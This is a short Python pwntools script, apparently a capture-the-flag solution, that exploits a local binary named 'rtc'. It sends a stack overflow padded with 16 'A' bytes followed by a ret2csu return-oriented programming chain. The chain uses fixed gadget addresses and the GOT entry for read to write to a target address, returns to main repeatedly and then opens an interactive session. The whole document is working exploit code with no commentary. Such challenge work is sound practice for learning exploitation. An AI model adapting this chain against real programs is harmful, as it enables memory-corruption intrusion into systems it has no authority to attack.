from pwn import *

p = process('./rtc')
e = ELF('./rtc')

target = 0x0000000000601050
csu = 0x000000000040069A
p.send('asdf')

# rdi rsi rdx
#pause()
payload = 'A'*16
payload += p64(csu)
payload += p64(e.got['read']/8) #rbx
payload += p64(e.got['read']/8+1) #rbp
payload += p64(0) #r12
payload += p64(8) #r13
payload += p64(target) #r14
payload += p64(0) #r15
payload += p64(0x400680)

payload +=p64(e.symbols['main'])*13
sleep(0.3)
p.send(payload)
sleep(0.3)
p.send('BBBBBBBB')
p.interactive()
